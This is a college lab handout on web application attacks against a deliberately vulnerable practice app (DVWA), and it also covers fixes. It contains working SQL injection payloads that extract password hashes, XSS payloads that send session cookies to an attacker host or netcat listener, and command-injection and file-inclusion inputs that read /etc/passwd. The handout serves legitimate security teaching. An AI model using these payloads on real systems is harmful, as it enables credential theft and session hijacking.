# Practical 8: Web Application Attacks

**Atiam College - Cyber Security & Ethical Hacking**
**Module:** Week 10 - Web Application Security
**Duration:** 3–4 Hours
**Difficulty:** Intermediate–Advanced

---

## Objective

By the end of this practical, you will be able to:

- Set up and use DVWA (Damn Vulnerable Web Application) as a practice target
- Perform SQL Injection attacks and understand how they work
- Perform Cross-Site Scripting (XSS) attacks (reflected and stored)
- Use Burp Suite to intercept and modify HTTP requests
- Understand the OWASP Top 10 vulnerabilities in practice
- Apply fixes and understand secure coding practices

---

## Prerequisites

- Kali Linux VM with internet access (for installing DVWA if needed)
- Completed Practicals 5–7
- Basic understanding of how websites work (HTML, forms, URLs)

---

## Tools Used

| Tool | What It Does |
|------|-------------|
| DVWA | Intentionally vulnerable web app for practicing attacks |
| Burp Suite | Web proxy - intercepts, views, and modifies HTTP traffic |
| Firefox | Web browser with proxy configuration |
| `curl` | Command-line tool for making HTTP requests |

---

## Real-World Context

Web applications are the most common target for cyber attacks. Every bank, government, and business has web applications, and most have security flaws. **The OWASP Top 10** is the industry standard list of the most critical web application security risks. SQL Injection and XSS have been in the top 10 for over 20 years and are still found regularly in modern applications.

Understanding these attacks makes you valuable to any organization - whether you are testing their applications or defending them.

---

## Part 1: Setting Up DVWA

DVWA is already installed on Metasploitable 2 and accessible via the web browser.

### Step 1.1 - Access DVWA

Open Firefox on your Kali VM and navigate to:

```
http://192.168.56.101/dvwa/
```

(Replace with your Metasploitable IP.)

### Step 1.2 - Login

Default credentials:

```
Username: admin
Password: password
```

### Step 1.3 - Set Security Level

After logging in:

1. Click **DVWA Security** in the left menu
2. Set the security level to **Low**
3. Click **Submit**

We start on Low to understand the basics. Later, you can increase to Medium and High to see how defenses work.

### Step 1.4 - Initialize the Database

1. Click **Setup / Reset DB** in the left menu
2. Click **Create / Reset Database**

DVWA is now ready.

---

## Part 2: SQL Injection

SQL Injection happens when user input is inserted directly into a database query without proper validation. It is one of the most dangerous and common web vulnerabilities.

### Step 2.1 - Understanding the Vulnerable Page

1. Click **SQL Injection** in the left menu
2. You see a text field that says "User ID"
3. Enter `1` and click Submit

**Expected output:**

```
ID: 1
First name: admin
Surname: admin
```

This is a normal query. The application takes your input and runs a SQL query like:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

### Step 2.2 - Test for SQL Injection

Enter this in the User ID field:

```
1' OR '1'='1
```

Click Submit.

**Expected output:** ALL users are displayed, not just user 1.

**Why this works:** The query becomes:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

Since `'1'='1'` is always true, the query returns ALL rows.

### Step 2.3 - Extract Database Information

Enter this:

```
1' UNION SELECT user(), version() -- -
```

**Expected output:**

```
ID: 1' UNION SELECT user(), version() -- -
First name: root@localhost
Surname: 5.0.51a-3ubuntu5
```

You just extracted the database username (`root@localhost`) and MySQL version (`5.0.51a`). The `UNION SELECT` lets you add your own query to the original one.

### Step 2.4 - Extract All Database Tables

```
1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema = 'dvwa' -- -
```

This lists all tables in the DVWA database.

### Step 2.5 - Extract Usernames and Password Hashes

```
1' UNION SELECT user, password FROM dvwa.users -- -
```

**Expected output:**

```
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
```

Those "surnames" are actually MD5 password hashes! You have just stolen the credentials.

### Step 2.6 - Crack the Hashes

Open a new terminal:

```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
echo "e99a18c428cb38d5f260853678922e03" >> hash.txt

# Use john or hashcat to crack, or use an online lookup
# The first hash is MD5 of "password"
# The second hash is MD5 of "abc123"
```

You can also look them up at `https://crackstation.net/` (they are common passwords).

> **Why this matters:** SQL Injection can expose an entire database - usernames, passwords, personal data, financial records. In the real world, SQL Injection has been responsible for breaches affecting millions of users (TalkTalk, Heartland Payment Systems, Sony). This is why it is rated as a critical vulnerability.

---

## Part 3: Cross-Site Scripting (XSS)

XSS happens when an application displays user input without proper sanitization, allowing attackers to inject malicious JavaScript code.

### Step 3.1 - Reflected XSS

1. Click **XSS (Reflected)** in the DVWA menu
2. You see a text field asking "What's your name?"
3. Enter your name normally first: `John`
4. You see: `Hello John`

Now enter:

```html
<script>alert('XSS')</script>
```

**Expected result:** A popup alert box appears saying "XSS". The browser executed your JavaScript code.

### Step 3.2 - Why This Is Dangerous

That alert box is just a demonstration. In a real attack, instead of `alert()`, an attacker would use JavaScript to:

```html
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

This would steal the user's session cookie and send it to the attacker's server. With that cookie, the attacker can hijack the user's session - log in as them without knowing their password.

### Step 3.3 - Stored XSS

1. Click **XSS (Stored)** in the DVWA menu
2. You see a guestbook with Name and Message fields
3. In the **Message** field, enter:

```html
<script>alert('Stored XSS')</script>
```

4. Click **Sign Guestbook**

**Expected result:** Every time anyone visits this page, the alert pops up. The malicious script is stored in the database and served to every visitor.

### Step 3.4 - Stealing Cookies with Stored XSS

In the message field, enter:

```html
<script>document.write('<img src="http://KALI_IP:8888/steal?cookie='+document.cookie+'">')</script>
```

(Replace KALI_IP with your Kali VM's IP.)

Before submitting, set up a listener on Kali to catch the cookie:

```bash
# In a new terminal
nc -lvnp 8888
```

Now submit the guestbook entry and watch your Netcat listener - you will see the cookie arrive.

> **Why this matters:** Stored XSS is more dangerous than reflected because it affects every user who visits the page, not just one person clicking a malicious link. It has been used to steal sessions from thousands of users simultaneously.

---

## Part 4: Burp Suite Basics

Burp Suite is a web application testing proxy. It sits between your browser and the web server, allowing you to intercept, view, and modify every request.

### Step 4.1 - Start Burp Suite

```bash
burpsuite
```

When it opens:
1. Select **Temporary Project** → **Next**
2. Select **Use Burp defaults** → **Start Burp**

### Step 4.2 - Configure Firefox to Use Burp as Proxy

1. In Firefox, go to **Settings** → **Network Settings** → **Settings**
2. Select **Manual proxy configuration**
3. HTTP Proxy: `127.0.0.1`, Port: `8080`
4. Check **Also use this proxy for HTTPS**
5. Click **OK**

### Step 4.3 - Enable Interception

1. In Burp Suite, go to the **Proxy** tab
2. Click **Intercept is off** to toggle it to **Intercept is on**

### Step 4.4 - Intercept a Request

1. In Firefox, go to `http://192.168.56.101/dvwa/vulnerabilities/sqli/`
2. Enter `1` in the User ID field and click Submit
3. **The page will hang** - Burp has intercepted the request

Look at Burp Suite. You will see the raw HTTP request:

```
GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: 192.168.56.101
Cookie: PHPSESSID=abc123; security=low
```

### Step 4.5 - Modify the Request

In Burp, change `id=1` to:

```
id=1' OR '1'='1
```

Click **Forward** to send the modified request.

**Expected result:** The SQL injection works - the browser shows all users, even though you typed `1` in the form.

### Step 4.6 - Use the Repeater

The Repeater lets you send requests repeatedly with modifications:

1. In Proxy → HTTP history, find your SQL injection request
2. Right-click → **Send to Repeater**
3. Go to the **Repeater** tab
4. Modify the `id` parameter and click **Send**
5. See the response immediately in the right pane

This is much faster than using the browser for testing.

### Step 4.7 - Turn Off the Proxy When Done

Remember to disable the proxy in Firefox when you are finished, or your browser will not work normally:

1. Firefox → **Settings** → **Network Settings** → **No proxy**

> **Why this matters:** Burp Suite is the industry standard tool for web application testing. Professional penetration testers use it daily. Learning to intercept and modify requests is essential for finding vulnerabilities that automated scanners miss.

---

## Part 5: Understanding the OWASP Top 10

The OWASP Top 10 is a list of the most critical web application security risks. Here is how they relate to what you have practiced:

| # | OWASP Risk | What You Did |
|---|-----------|-------------|
| A01 | Broken Access Control | - (explored in DVWA challenge) |
| A02 | Cryptographic Failures | Extracted MD5 password hashes (weak hashing) |
| A03 | Injection (SQL, XSS) | SQL Injection + XSS practicals |
| A04 | Insecure Design | DVWA's vulnerable code is insecure by design |
| A05 | Security Misconfiguration | Default DVWA credentials (admin/password) |
| A06 | Vulnerable Components | Outdated PHP/MySQL versions |
| A07 | Authentication Failures | Default/weak passwords, session hijacking via XSS |
| A08 | Software Integrity Failures | - (supply chain attacks, not covered in lab) |
| A09 | Logging Failures | DVWA does not log your attacks |
| A10 | Server-Side Request Forgery | - (advanced topic) |

---

## Part 6: How to Fix These Vulnerabilities

Understanding attacks is only half the job. You must also understand the defenses.

### Fixing SQL Injection

**Vulnerable code (what DVWA uses on Low security):**

```php
$query = "SELECT * FROM users WHERE user_id = '$id'";
```

**Secure code (parameterized query):**

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

The `?` placeholder ensures user input is never treated as SQL code.

### Fixing XSS

**Vulnerable code:**

```php
echo "Hello " . $_GET['name'];
```

**Secure code:**

```php
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

`htmlspecialchars()` converts `<script>` to `&lt;script&gt;`, so the browser displays it as text instead of executing it.

### Step 6.1 - See the Defenses in Action

1. Go to **DVWA Security** and change the level to **Medium**
2. Try the same SQL Injection: `1' OR '1'='1`
3. It may fail or partially work - the application now has some defenses
4. Change to **High** and try again
5. On High, most attacks should fail

This demonstrates the difference between insecure and secure code.

---

## Challenge Section (Optional)

1. **Command Injection** - Go to the Command Injection page in DVWA. Try entering `; ls` or `| cat /etc/passwd` after the IP address.
2. **File Inclusion** - Explore the File Inclusion page. Try accessing `/etc/passwd` through the URL parameter.
3. **Try Medium security** - Repeat SQL Injection and XSS on Medium security. How do the defenses change? Can you bypass them?

---

## Summary & Outcomes

| Skill | Status |
|-------|--------|
| Set up and use DVWA for practice | Yes |
| Perform SQL Injection (UNION-based) | Yes |
| Extract database users and password hashes | Yes |
| Perform Reflected and Stored XSS | Yes |
| Use Burp Suite to intercept and modify requests | Yes |
| Understand the OWASP Top 10 | Yes |
| Understand how to fix SQLi and XSS | Yes |

---

## Reflection Questions

1. Why is SQL Injection still so common even though the fix (parameterized queries) has been known for over 20 years?
2. What is the difference between reflected XSS and stored XSS? Which is more dangerous and why?
3. You extracted MD5 password hashes from the database. Why is MD5 a bad choice for password hashing? What should be used instead?
4. How does Burp Suite help find vulnerabilities that automated scanners might miss?
5. A company asks you to test their web application. What is the first thing you should do before starting? (Hint: it is not technical.)
